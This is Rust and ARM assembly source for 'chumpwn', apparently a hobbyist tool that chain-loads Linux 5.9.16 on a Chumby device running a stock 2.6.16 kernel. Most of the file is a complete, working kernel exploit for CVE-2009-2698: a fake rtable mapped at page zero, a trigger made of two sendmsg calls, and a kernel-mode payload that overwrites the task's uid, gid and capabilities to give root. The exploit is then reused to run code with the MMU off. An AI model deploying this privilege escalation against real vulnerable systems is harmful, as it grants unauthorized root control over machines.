//! chumpwn: sideload a NAND-less Linux 5.9.16 from stock Chumby 2.6.16.
//!
//! This is a bare-metal, statically linked ARM EABI program with a PT_LOAD
//! at virtual address 0.  It runs from `/psp/rfs1/rcS` (or a shell/USB
//! stick), uses CVE-2009-2698 to obtain uid 0 and all capabilities, maps
//! `/dev/mem`, stages a 5.9.16 zImage + initramfs outside NAND (a QEMU
//! loader blob at 0xc2000000, or files on a USB stick), and handoffs with
//! the MMU off.
#![no_std]
#![no_main]

use core::arch::{asm, global_asm};
use core::panic::PanicInfo;

#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    loop {}
}

// The compiler may emit calls to the C memory routines even in no_std.
// These are deliberately simple; the binary is a single-threaded loader.
use core::ffi::c_void;

#[no_mangle]
pub unsafe extern "C" fn memset(dst: *mut c_void, c: i32, n: usize) -> *mut c_void {
    let d = dst as *mut u8;
    let mut i = 0;
    while i < n {
        core::ptr::write_volatile(d.add(i), c as u8);
        i += 1;
    }
    dst
}

#[no_mangle]
pub unsafe extern "C" fn memcpy(dst: *mut c_void, src: *const c_void, n: usize) -> *mut c_void {
    let d = dst as *mut u8;
    let s = src as *const u8;
    let mut i = 0;
    while i < n {
        core::ptr::write_volatile(d.add(i), core::ptr::read_volatile(s.add(i)));
        i += 1;
    }
    dst
}

#[no_mangle]
pub unsafe extern "C" fn memmove(dst: *mut c_void, src: *const c_void, n: usize) -> *mut c_void {
    if (dst as usize) <= (src as usize) {
        memcpy(dst, src, n)
    } else {
        let d = dst as *mut u8;
        let s = src as *const u8;
        let mut i = n;
        while i > 0 {
            i -= 1;
            core::ptr::write_volatile(d.add(i), core::ptr::read_volatile(s.add(i)));
        }
        dst
    }
}

#[no_mangle]
pub unsafe extern "C" fn memcmp(a: *const c_void, b: *const c_void, n: usize) -> i32 {
    let x = a as *const u8;
    let y = b as *const u8;
    let mut i = 0;
    while i < n {
        let xb = core::ptr::read_volatile(x.add(i));
        let yb = core::ptr::read_volatile(y.add(i));
        if xb != yb {
            return xb as i32 - yb as i32;
        }
        i += 1;
    }
    0
}

#[no_mangle]
pub unsafe extern "C" fn strlen(s: *const u8) -> usize {
    let p = s as *const u8;
    let mut n = 0;
    while core::ptr::read_volatile(p.add(n)) != 0 {
        n += 1;
    }
    n
}

// ---------------------------------------------------------------------------
// Layout.  The i.MX21 SDRAM is at 0xc0000000.  The stock 2.6.16 kernel gets
// the QEMU loader container at 0xc2000000; that area is still free at rcS
// (verified), and the stock kernel's direct map covers it.  User mappings use
// low aliases because 0xc0000000 is above the 3 GiB user/kernel split.  Every
// physical address here is SDRAM, not the NAND controller or an MTD device.
const SRC_PHYS: u32 = 0xc200_0000;
const SRC_VA: u32 = 0x0200_0000;
// Matches mkpayload.py's LIMIT: the container's room to grow before it
// nears ATAGS at 0xc3f00000.
const SRC_MAP_LEN: u32 = 0x0070_0000;

const KERNEL_DST_VA: u32 = 0x0200_0000;
const KERNEL_MAP_LEN: u32 = 0x0060_0000;

const INITRD_DST_PHYS: u32 = 0xc280_0000;
const INITRD_DST_VA: u32 = 0x0280_0000;
const INITRD_MAP_LEN: u32 = 0x0020_0000;

/* The C chainload's ATAGS/stub addresses.  The stock kernel's direct map
 * covers all 64 MiB, so the stub executes here with the MMU on and continues
 * at the same physical address after the MMU is disabled. */
const ATAGS_PHYS: u32 = 0xc3f0_0000;
const ATAGS_VA: u32 = 0x03f0_0000;
const STUB_PHYS: u32 = 0xc3f8_0000;
const STUB_VA: u32 = 0x03f8_0000;

const PAGE: u32 = 0x1000;

// ARM private syscall numbers, 2.6.16 EABI.
const SYS_EXIT: usize = 1;
const SYS_READ: usize = 3;
const SYS_WRITE: usize = 4;
const SYS_OPEN: usize = 5;
const SYS_CLOSE: usize = 6;
const SYS_CACHEFLUSH: usize = 0x0f00_02;
const SYS_UNAME: usize = 122;
const SYS_GETUID32: usize = 199;
const SYS_GETGID32: usize = 200;
const SYS_SETUID32: usize = 213;
const SYS_SETGID32: usize = 214;
const SYS_SOCKET: usize = 281;
const SYS_SENDMSG: usize = 296;
const SYS_MMAP2: usize = 192;
const SYS_CAPGET: usize = 184;

const AF_INET: usize = 2;
const SOCK_DGRAM: usize = 2;
const MSG_PROBE: usize = 0x10;
const MSG_MORE: usize = 0x8000;

const PROT_READ: usize = 1;
const PROT_WRITE: usize = 2;
const MAP_SHARED: usize = 1;
const MAP_FIXED: usize = 0x10;

const ATAG_CORE: u32 = 0x5441_0001;
const ATAG_MEM: u32 = 0x5441_0002;
const ATAG_INITRD2: u32 = 0x5442_0005;
const ATAG_CMDLINE: u32 = 0x5441_0009;

const DEFAULT_CMDLINE: &[u8] = b"console=ttymxc0,115200 rdinit=/init";

// ---------------------------------------------------------------------------
// Entry and the page-zero / kernel-mode payloads.

global_asm!(
    r#"
    .syntax unified
    .arm

    .section .text._start,"ax",%progbits
    .global _start
    .type _start,%function
_start:
    mov r0, sp
    bl  chumpwn_main
1:  b   1b
    .size _start, .-_start

    /* The fake page mapped at virtual 0 by the ELF loader.  It holds the
       fake struct rtable (output at 0x74) and the uid/gid at 0x100/0x104. */
    .section .zero,"aw",%progbits
    .space 4096

    /* Kernel-mode payload called from ip_append_data() with rt == NULL.
       ARM 2.6.16: current_thread_info() is sp & ~(THREAD_SIZE-1), THREAD_SIZE
       is 8192, thread_info->task is at offset 12.  The task_struct has eight
       consecutive uid/gid words, then group_info, then cap_effective,
       cap_inheritable and cap_permitted. */
    .section .text.kernel_payload,"ax",%progbits
    .global kernel_payload
    .type kernel_payload,%function
kernel_payload:
    push    {{r4-r11, lr}}
    mov     r4, sp
    ldr     r5, =0x1fff
    bic     r4, r4, r5
    ldr     r4, [r4, #12]       @ current task_struct
    ldr     r5, =0x100
    ldr     r6, [r5]            @ uid
    ldr     r7, [r5, #4]        @ gid
    mov     r8, #0
1:
    add     r9, r4, r8
    ldr     r10, [r9]
    cmp     r10, r6
    bne     2f
    ldr     r10, [r9, #4]
    cmp     r10, r6
    bne     2f
    ldr     r10, [r9, #8]
    cmp     r10, r6
    bne     2f
    ldr     r10, [r9, #12]
    cmp     r10, r6
    bne     2f
    ldr     r10, [r9, #16]
    cmp     r10, r7
    bne     2f
    ldr     r10, [r9, #20]
    cmp     r10, r7
    bne     2f
    ldr     r10, [r9, #24]
    cmp     r10, r7
    bne     2f
    ldr     r10, [r9, #28]
    cmp     r10, r7
    bne     2f
    mov     r10, #0
    str     r10, [r9]
    str     r10, [r9, #4]
    str     r10, [r9, #8]
    str     r10, [r9, #12]
    str     r10, [r9, #16]
    str     r10, [r9, #20]
    str     r10, [r9, #24]
    str     r10, [r9, #28]
    mvn     r10, #0
    str     r10, [r9, #0x24]    @ cap_effective
    str     r10, [r9, #0x28]    @ cap_inheritable
    str     r10, [r9, #0x2c]    @ cap_permitted
    b       3f
2:
    add     r8, r8, #4
    cmp     r8, #0x1000
    blt     1b
3:
    mov     r0, #0
    pop     {{r4-r11, pc}}
    .size kernel_payload, .-kernel_payload
    .ltorg

    /* Kernel-mode jump payload copied to virtual 0x80.  It disables
       IRQ/FIQ, invalidates the I-cache and TLB, then jumps to the stub. */
    .section .text.jump_blob,"ax",%progbits
    .global jump_blob_start
    .global jump_blob_end
jump_blob_start:
    mrs     r1, cpsr
    orr     r1, r1, #0xc0
    msr     cpsr_c, r1
    mov     r0, #0
    mcr     p15, 0, r0, c7, c5, 0   @ invalidate I cache
    mcr     p15, 0, r0, c8, c7, 0   @ invalidate TLB
    ldr     pc, [pc, #0]
    nop
    .word   0xc3f80000
jump_blob_end:

    /* Handoff stub copied to physical 0xc3f80000.  Entered in SVC mode
       with the MMU on, identity-mapped, so clearing the MMU leaves the PC
       on the same physical instruction. */
    .section .text.stub_blob,"ax",%progbits
    .global stub_blob_start
    .global stub_blob_end
stub_blob_start:
    mrs     r3, cpsr
    orr     r3, r3, #0xc0
    msr     cpsr_c, r3
    mov     r0, #0
    mcr     p15, 0, r0, c7, c14, 0  @ clean and invalidate D cache
    mcr     p15, 0, r0, c7, c10, 4  @ drain write buffer
    mcr     p15, 0, r0, c7, c5, 0   @ invalidate I cache
    mcr     p15, 0, r0, c8, c7, 0   @ invalidate TLB
    mrc     p15, 0, r0, c1, c0, 0
    bic     r0, r0, #0x00000005     @ MMU off, D cache off
    bic     r0, r0, #0x00001000     @ I cache off
    mcr     p15, 0, r0, c1, c0, 0
    nop
    nop
    nop
    nop
    ldr     r0, =0
    ldr     r1, =851
    ldr     r2, =0xc3f00000
    ldr     pc, =0xc2000000
    .ltorg
stub_blob_end:
"#
);

extern "C" {
    fn kernel_payload();
    static jump_blob_start: u8;
    static jump_blob_end: u8;
    static stub_blob_start: u8;
    static stub_blob_end: u8;
}

// ---------------------------------------------------------------------------
// Minimal syscalls.

#[inline(always)]
unsafe fn syscall6(n: usize, a: usize, b: usize, c: usize, d: usize, e: usize, f: usize) -> isize {
    let mut r0 = a;
    asm!(
        "svc 0",
        in("r7") n,
        inout("r0") r0,
        in("r1") b,
        in("r2") c,
        in("r3") d,
        in("r4") e,
        in("r5") f,
        options(nostack)
    );
    r0 as isize
}

#[inline(always)]
unsafe fn syscall3(n: usize, a: usize, b: usize, c: usize) -> isize {
    syscall6(n, a, b, c, 0, 0, 0)
}

unsafe fn write(fd: usize, buf: &[u8]) {
    syscall3(SYS_WRITE, fd, buf.as_ptr() as usize, buf.len());
}

unsafe fn print(s: &[u8]) {
    write(1, s);
}

unsafe fn print_str(s: &str) {
    print(s.as_bytes());
}

unsafe fn print_hex(v: u32) {
    let mut b = [0u8; 11];
    b[0] = b'0';
    b[1] = b'x';
    const HEX: &[u8; 16] = b"0123456789abcdef";
    for i in 0..8 {
        b[2 + i] = HEX[((v >> (28 - 4 * i)) & 15) as usize];
    }
    b[10] = b'\n';
    print(&b);
}

unsafe fn print_dec(mut v: u32) {
    let mut b = [0u8; 12];
    let mut i = 11;
    b[i] = b'\n';
    if v == 0 {
        i -= 1;
        b[i] = b'0';
    }
    while v != 0 {
        i -= 1;
        b[i] = b'0' + (v % 10) as u8;
        v /= 10;
    }
    print(&b[i..]);
}

unsafe fn cstr_len(p: *const u8) -> usize {
    let mut n = 0;
    while *p.add(n) != 0 {
        n += 1;
    }
    n
}

unsafe fn cstr(p: *const u8) -> &'static [u8] {
    core::slice::from_raw_parts(p, cstr_len(p))
}

unsafe fn str_eq(a: &[u8], b: &[u8]) -> bool {
    if a.len() != b.len() {
        return false;
    }
    let mut i = 0;
    while i < a.len() {
        if a[i] != b[i] {
            return false;
        }
        i += 1;
    }
    true
}

unsafe fn parse_u32(s: &[u8]) -> Option<u32> {
    if s.is_empty() {
        return None;
    }
    let mut v: u32 = 0;
    let mut i = 0;
    let mut base = 10u32;
    if s.len() > 2 && s[0] == b'0' && (s[1] == b'x' || s[1] == b'X') {
        base = 16;
        i = 2;
    }
    if i >= s.len() {
        return None;
    }
    while i < s.len() {
        let c = s[i];
        let d = match c {
            b'0'..=b'9' => (c - b'0') as u32,
            b'a'..=b'f' => (c - b'a' + 10) as u32,
            b'A'..=b'F' => (c - b'A' + 10) as u32,
            _ => return None,
        };
        if d >= base {
            return None;
        }
        v = v.checked_mul(base)?.checked_add(d)?;
        i += 1;
    }
    Some(v)
}

// ---------------------------------------------------------------------------
// CVE-2009-2698.

#[repr(C)]
struct SockaddrIn {
    family: u16,
    port: u16,
    addr: u32,
    zero: [u8; 8],
}

#[repr(C)]
struct Msghdr {
    name: *const u8,
    namelen: i32,
    iov: *const u8,
    iovlen: u32,
    control: *const u8,
    controllen: u32,
    flags: u32,
}

/* C chainload.c trigger_poc() and stage2/exploit.c: two sendmsg calls on a
 * loopback UDP socket.  MSG_PROBE|MSG_MORE on the first makes
 * ip_append_data() dereference the NULL rtable; the second reaches
 * rt->u.dst.output at 0x74. */
unsafe fn trigger() -> isize {
    let sin = SockaddrIn {
        family: AF_INET as u16,
        port: 0x1600,      // htons(22)
        addr: 0x0100_007f, // 127.0.0.1
        zero: [0; 8],
    };
    let msg = Msghdr {
        name: &sin as *const SockaddrIn as *const u8,
        namelen: core::mem::size_of::<SockaddrIn>() as i32,
        iov: core::ptr::null(),
        iovlen: 0,
        control: core::ptr::null(),
        controllen: 0,
        flags: 0,
    };
    let s = syscall3(SYS_SOCKET, AF_INET, SOCK_DGRAM, 0);
    if s < 0 {
        return s;
    }
    let r1 = syscall3(SYS_SENDMSG, s as usize, &msg as *const Msghdr as usize, MSG_MORE | MSG_PROBE);
    let r2 = syscall3(SYS_SENDMSG, s as usize, &msg as *const Msghdr as usize, 0);
    syscall3(SYS_CLOSE, s as usize, 0, 0);
    if r1 < 0 {
        r1
    } else {
        r2
    }
}

/* C chainload.c cacheflush(): ARM private syscall 0x0f0002.  The handoff
 * runs with the MMU off, so every staged byte must reach physical memory. */
unsafe fn cacheflush(start: u32, end: u32) -> isize {
    syscall3(SYS_CACHEFLUSH, start as usize, end as usize, 0)
}

/* C chainload.c map_phys(): mmap2 /dev/mem with MAP_FIXED; the i.MX21 is
 * above the 3 GiB user/kernel split, so each physical page also needs a
 * low user virtual address. */
unsafe fn map_phys(fd: usize, va: u32, pa: u32, len: u32) -> isize {
    syscall6(
        SYS_MMAP2,
        va as usize,
        len as usize,
        PROT_READ | PROT_WRITE,
        MAP_SHARED | MAP_FIXED,
        fd,
        (pa >> 12) as usize,
    )
}

unsafe fn copy(dst: u32, src: u32, len: u32) {
    let d = dst as *mut u8;
    let s = src as *const u8;
    let mut i = 0;
    while i < len {
        core::ptr::write_volatile(d.add(i as usize), core::ptr::read_volatile(s.add(i as usize)));
        i += 1;
    }
}

unsafe fn copy_volatile(dst: *mut u8, src: *const u8, len: usize) {
    let mut i = 0;
    while i < len {
        core::ptr::write_volatile(dst.add(i), core::ptr::read_volatile(src.add(i)));
        i += 1;
    }
}

/* C chainload.c build_atags(), plus ATAG_INITRD2 for a separate initramfs.
 * ARM ATAGS are a sequence of {size, tag, payload...} words; ATAG_MEM is
 * {size, start}, ATAG_INITRD2 is {start, size}, and ATAG_NONE is two zero
 * words. */
unsafe fn build_atags(p: u32, initrd_start: u32, initrd_size: u32, cmdline: &[u8]) {
    let q = p as *mut u32;
    let mut n = 0usize;
    macro_rules! put {
        ($v:expr) => {{
            core::ptr::write_volatile(q.add(n), $v);
            n += 1;
        }};
    }
    put!(2); // ATAG_CORE
    put!(ATAG_CORE);
    put!(4); // ATAG_MEM
    put!(ATAG_MEM);
    put!(0x0400_0000); // 64 MiB, size then start
    put!(0xc000_0000);
    put!(4); // ATAG_INITRD2
    put!(ATAG_INITRD2);
    put!(initrd_start);
    put!(initrd_size);
    let len = cmdline.len() + 1; // include NUL
    let words = (len + 3) / 4;
    put!(2 + words as u32); // ATAG_CMDLINE
    put!(ATAG_CMDLINE);
    let s = q.add(n) as *mut u8; // cmdline bytes, zero-padded to words
    let mut j = 0;
    while j < words * 4 {
        let b = if j < cmdline.len() { cmdline[j] } else { 0 };
        core::ptr::write_volatile(s.add(j), b);
        j += 1;
    }
    n += words;
    put!(0); // ATAG_NONE
    put!(0);
    let _ = n;
}

// ---------------------------------------------------------------------------
// Container and files.

#[repr(C)]
struct Header {
    magic: [u8; 8],
    version: u32,
    header_size: u32,
    kernel_off: u32,
    kernel_size: u32,
    initrd_off: u32,
    initrd_size: u32,
    flags: u32,
    reserved: u32,
}

unsafe fn read_file(path: &[u8], dst: u32, max: u32) -> Option<u32> {
    let mut p = [0u8; 256];
    if path.len() + 1 > p.len() {
        return None;
    }
    let mut i = 0;
    while i < path.len() {
        p[i] = path[i];
        i += 1;
    }
    p[path.len()] = 0;
    let fd = syscall3(SYS_OPEN, p.as_ptr() as usize, 0, 0);
    if fd < 0 {
        return None;
    }
    let mut got: u32 = 0;
    loop {
        if got >= max {
            syscall3(SYS_CLOSE, fd as usize, 0, 0);
            return None;
        }
        let n = syscall3(SYS_READ, fd as usize, (dst + got) as usize, (max - got) as usize);
        if n < 0 {
            syscall3(SYS_CLOSE, fd as usize, 0, 0);
            return None;
        }
        if n == 0 {
            break;
        }
        got += n as u32;
    }
    syscall3(SYS_CLOSE, fd as usize, 0, 0);
    Some(got)
}

/* Read the QEMU loader container: header, then zImage at +0x1000 and the
 * initramfs after it.  The zImage destination is the container base (the
 * kernel's normal load address); copying forward is safe because the header
 * has been parsed and dest < source. */
unsafe fn load_container(base_va: u32, initrd_dst: u32) -> Option<(u32, u32)> {
    let h = &*(base_va as *const Header);
    if &h.magic != b"CHUMPWN1" {
        return None;
    }
    let version = h.version;
    let header_size = h.header_size;
    let kernel_off = h.kernel_off;
    let kernel_size = h.kernel_size;
    let initrd_off = h.initrd_off;
    let initrd_size = h.initrd_size;
    if version != 1 || header_size != core::mem::size_of::<Header>() as u32 {
        return None;
    }
    print_str("chumpwn: container kernel=");
    print_dec(kernel_size);
    print_str("chumpwn: container initramfs=");
    print_dec(initrd_size);
    if kernel_size == 0
        || initrd_size == 0
        || kernel_off < header_size
        || initrd_off < header_size
        || kernel_off + kernel_size > SRC_MAP_LEN
        || initrd_off + initrd_size > SRC_MAP_LEN
    {
        return None;
    }
    copy(base_va, base_va + kernel_off, kernel_size);
    copy(initrd_dst, base_va + initrd_off, initrd_size);
    print_str("chumpwn: copied kernel and initramfs\n");
    Some((kernel_size, initrd_size))
}

// ---------------------------------------------------------------------------
// Main.

#[no_mangle]
pub unsafe extern "C" fn chumpwn_main(sp: *const u32) -> ! {
    let argc = *sp as usize;
    let argv = sp.add(1) as *const *const u8;

    let mut source: Option<u32> = Some(SRC_PHYS);
    let mut kernel_file: Option<&[u8]> = None;
    let mut initrd_file: Option<&[u8]> = None;
    let mut cmdline: &[u8] = DEFAULT_CMDLINE;

    let mut i = 1;
    while i < argc {
        let a = cstr(*argv.add(i));
        if str_eq(a, b"--source") && i + 1 < argc {
            i += 1;
            source = parse_u32(cstr(*argv.add(i)));
        } else if str_eq(a, b"--no-source") {
            source = None;
        } else if str_eq(a, b"--kernel") && i + 1 < argc {
            i += 1;
            kernel_file = Some(cstr(*argv.add(i)));
            source = None;
        } else if str_eq(a, b"--initramfs") && i + 1 < argc {
            i += 1;
            initrd_file = Some(cstr(*argv.add(i)));
        } else if str_eq(a, b"--cmdline") && i + 1 < argc {
            i += 1;
            cmdline = cstr(*argv.add(i));
        }
        i += 1;
    }

    print_str("\nchumpwn: start uid=");
    let mut uid = syscall3(SYS_GETUID32, 0, 0, 0) as u32;
    let mut gid = syscall3(SYS_GETGID32, 0, 0, 0) as u32;
    print_dec(uid);

    // Run the exploit as an ordinary user, even when rcS started us as root.
    if uid == 0 {
        syscall3(SYS_SETGID32, 1000, 0, 0);
        syscall3(SYS_SETUID32, 1000, 0, 0);
        uid = syscall3(SYS_GETUID32, 0, 0, 0) as u32;
        gid = syscall3(SYS_GETGID32, 0, 0, 0) as u32;
        print_str("chumpwn: dropped to uid=");
        print_dec(uid);
    }

    let mut un: [u8; 390] = [0; 390];
    if syscall3(SYS_UNAME, un.as_mut_ptr() as usize, 0, 0) == 0 {
        print_str("chumpwn: stock kernel ");
        let start = 130; // release field in struct utsname (65*2)
        let mut n = 0;
        while start + n < 195 && un[start + n] != 0 {
            n += 1;
        }
        print(&un[start..start + n]);
        print(b"\n");
    }

    // First CVE trigger: zero this task's uid/gid and set all capabilities.
    core::ptr::write_volatile(0x74 as *mut u32, kernel_payload as *const () as usize as u32);
    core::ptr::write_volatile(0x100 as *mut u32, uid);
    core::ptr::write_volatile(0x104 as *mut u32, gid);
    let r = trigger();
    uid = syscall3(SYS_GETUID32, 0, 0, 0) as u32;
    print_str("chumpwn: first trigger r=");
    print_dec(r as u32);
    print_str("chumpwn: uid after=");
    print_dec(uid);
    if uid != 0 {
        print_str("chumpwn: FAIL: no root\n");
        syscall3(SYS_EXIT, 1, 0, 0);
        loop {}
    }

    #[repr(C)]
    struct CapHeader {
        version: u32,
        pid: i32,
    }
    #[repr(C)]
    struct CapData {
        effective: u32,
        permitted: u32,
        inheritable: u32,
    }
    let mut ch = CapHeader { version: 0x1998_0330, pid: 0 };
    let mut cd = CapData { effective: 0, permitted: 0, inheritable: 0 };
    let cg = syscall3(SYS_CAPGET, &mut ch as *mut CapHeader as usize, &mut cd as *mut CapData as usize, 0);
    print_str("chumpwn: capget=");
    print_dec(cg as u32);
    print_str("chumpwn: caps eff=");
    print_hex(cd.effective);
    print_str("chumpwn: caps permitted=");
    print_hex(cd.permitted);
    print_str("chumpwn: caps inheritable=");
    print_hex(cd.inheritable);

    let memfd = syscall3(SYS_OPEN, b"/dev/mem\0".as_ptr() as usize, 2, 0);
    print_str("chumpwn: /dev/mem fd=");
    print_dec(memfd as u32);
    if memfd < 0 {
        print_str("chumpwn: FAIL: /dev/mem\n");
        syscall3(SYS_EXIT, 1, 0, 0);
        loop {}
    }

    let source_phys = source.unwrap_or(SRC_PHYS);
    let msrc = map_phys(memfd as usize, SRC_VA, source_phys, SRC_MAP_LEN);
    let mk = msrc;
    let mi = map_phys(memfd as usize, INITRD_DST_VA, INITRD_DST_PHYS, INITRD_MAP_LEN);
    let ma = map_phys(memfd as usize, ATAGS_VA, ATAGS_PHYS, PAGE);
    let ms = map_phys(memfd as usize, STUB_VA, STUB_PHYS, PAGE);
    print_str("chumpwn: mmap src=");
    print_hex(msrc as u32);
    print_str("chumpwn: mmap initrd=");
    print_hex(mi as u32);
    print_str("chumpwn: mmap atags=");
    print_hex(ma as u32);
    print_str("chumpwn: mmap stub=");
    print_hex(ms as u32);
    if (msrc as u32 & 0xffff_f000) != SRC_VA
        || (mk as u32 & 0xffff_f000) != KERNEL_DST_VA
        || (mi as u32 & 0xffff_f000) != INITRD_DST_VA
        || (ma as u32 & 0xffff_f000) != ATAGS_VA
        || (ms as u32 & 0xffff_f000) != STUB_VA
    {
        print_str("chumpwn: FAIL: mmap\n");
        syscall3(SYS_EXIT, 1, 0, 0);
        loop {}
    }

    let kernel_size;
    let initrd_size;
    if let Some(base) = source {
        match load_container(SRC_VA, INITRD_DST_VA) {
            Some((k, r)) => {
                kernel_size = k;
                initrd_size = r;
                print_str("chumpwn: source container at ");
                print_hex(base);
            }
            None => {
                print_str("chumpwn: FAIL: no CHUMPWN1 container at 0x");
                print_hex(base);
                syscall3(SYS_EXIT, 1, 0, 0);
                loop {}
            }
        }
    } else {
        let kf = match kernel_file {
            Some(p) => p,
            None => {
                print_str("chumpwn: FAIL: no --source or --kernel\n");
                syscall3(SYS_EXIT, 1, 0, 0);
                loop {}
            }
        };
        let rf = match initrd_file {
            Some(p) => p,
            None => {
                print_str("chumpwn: FAIL: no --initramfs\n");
                syscall3(SYS_EXIT, 1, 0, 0);
                loop {}
            }
        };
        kernel_size = match read_file(kf, KERNEL_DST_VA, KERNEL_MAP_LEN) {
            Some(n) => n,
            None => {
                print_str("chumpwn: FAIL: reading kernel file\n");
                syscall3(SYS_EXIT, 1, 0, 0);
                loop {}
            }
        };
        initrd_size = match read_file(rf, INITRD_DST_VA, INITRD_MAP_LEN) {
            Some(n) => n,
            None => {
                print_str("chumpwn: FAIL: reading initramfs file\n");
                syscall3(SYS_EXIT, 1, 0, 0);
                loop {}
            }
        };
        print_str("chumpwn: kernel file bytes=");
        print_dec(kernel_size);
        print_str("chumpwn: initramfs file bytes=");
        print_dec(initrd_size);
    }

    let kmagic = core::ptr::read_volatile((KERNEL_DST_VA + 0x24) as *const u32);
    print_str("chumpwn: kernel bytes=");
    print_dec(kernel_size);
    print_str("chumpwn: initramfs bytes=");
    print_dec(initrd_size);
    print_str("chumpwn: zImage magic=");
    print_hex(kmagic);
    if kmagic != 0x016f_2818 {
        print_str("chumpwn: FAIL: zImage magic\n");
        syscall3(SYS_EXIT, 1, 0, 0);
        loop {}
    }

    print_str("chumpwn: building ATAGS...\n");
    build_atags(ATAGS_VA, INITRD_DST_PHYS, initrd_size, cmdline);
    print_str("chumpwn: ATAGS done\n");
    let stub_len = (&stub_blob_end as *const u8 as usize) - (&stub_blob_start as *const u8 as usize);
    copy_volatile(STUB_VA as *mut u8, &stub_blob_start, stub_len);
    print_str("chumpwn: stub bytes=");
    print_dec(stub_len as u32);

    cacheflush(KERNEL_DST_VA, KERNEL_DST_VA + KERNEL_MAP_LEN);
    cacheflush(INITRD_DST_VA, INITRD_DST_VA + INITRD_MAP_LEN);
    cacheflush(ATAGS_VA, ATAGS_VA + PAGE);
    cacheflush(STUB_VA, STUB_VA + PAGE);

    // Second trigger: the kernel-mode jump payload at 0x80.
    let jump_len = (&jump_blob_end as *const u8 as usize) - (&jump_blob_start as *const u8 as usize);
    copy_volatile(0x80 as *mut u8, &jump_blob_start, jump_len);
    core::ptr::write_volatile(0x74 as *mut u32, 0x80);
    cacheflush(0, PAGE);
    print_str("chumpwn: second trigger -> ");
    print_hex(STUB_PHYS);

    let _ = trigger();
    print_str("chumpwn: FAIL: second trigger returned\n");
    syscall3(SYS_EXIT, 1, 0, 0);
    loop {}
}
